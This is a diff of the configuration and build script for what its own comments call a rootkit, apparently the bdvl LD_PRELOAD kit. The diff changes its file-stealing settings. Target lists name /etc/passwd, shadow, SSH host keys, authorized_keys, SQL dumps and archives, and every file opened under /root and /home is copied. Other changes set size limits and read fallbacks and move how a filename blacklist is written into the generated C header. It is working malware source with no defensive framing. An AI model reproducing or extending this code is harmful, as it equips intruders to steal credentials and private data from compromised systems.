@@ -72,8 +72,8 @@ FILE_STEAL = True  # if False then nothing below will apply.
 
 # you can also specify paths. wildcards apply..
 INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
-                      '*.log', 'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php',
-                      '*.zip', '*.tar', '*.tar.*', '*.rar', '*.db']
+                      'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php', '*.zip',
+                      '*.tar', '*.tar.*', '*.rar']
 
 # 'can be disabled' means by setting the appropriate value to
 # None the certain functionality will be disabled in the rootkit.
@@ -82,7 +82,7 @@ INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host
 # all files in these directories will be stolen when opened. can be disabled.
 INTERESTING_DIRECTORIES = ['/root', '/home']
 
-# when stealing files (from dirs mainly), ignore these filenames. wildcards apply. can be disabled. is by default.
+# when stealing files ignore these filenames. wildcards apply. can be disabled. is by default.
 NAMES_BLACKLIST = []
 
 MAX_FILE_SIZE      = (1024 * 1024) * 100   # don't try to steal files bigger than 100mb. file contents are mapped into memory & written in a new background process.
@@ -93,7 +93,7 @@ FILE_CLEANSE_TIMER = (60 * 60) * 8         # remove stolen files every 8 hours. 
 MAX_STEAL_SIZE = (1024 * 1024) * 800
 
 # if mapping the file contents fails, use the original method of reading & writing in blocks.
-ORIGINAL_RW_FALLBACK = False
+ORIGINAL_RW_FALLBACK = True
 
 # when a. copying the file fails
 #     (b. it exceeds MAX_FILE_SIZE)
@@ -115,7 +115,7 @@ SYMLINK_ONLY = False
 PATCH_DYNAMIC_LINKER = True
 
 
-# block size settings for reading target files & writing their copies.
+# block size settings for reading target files & writing their copies. (a few things use these values)
 BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
 MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.
 
@@ -581,10 +581,10 @@ def setup_config():
             gotbdvlh += '#define DIRECTORIES_TOO\n'
             intdirsarr = CArray('interesting_directories', INTERESTING_DIRECTORIES)
             gotbdvlh += intdirsarr.create()
-            if len(NAMES_BLACKLIST) > 0 and not NAMES_BLACKLIST == None:
-                gotbdvlh += '#define BLACKLIST_TOO\n'
-                namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
-                gotbdvlh += namesarr.create()
+        if len(NAMES_BLACKLIST) > 0 and not NAMES_BLACKLIST == None:
+            gotbdvlh += '#define BLACKLIST_TOO\n'
+            namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
+            gotbdvlh += namesarr.create()
 
     linksrc, linkdest = [], []
     KEYS, VALUES = list(LINKPATHS.keys()), list(LINKPATHS.values())
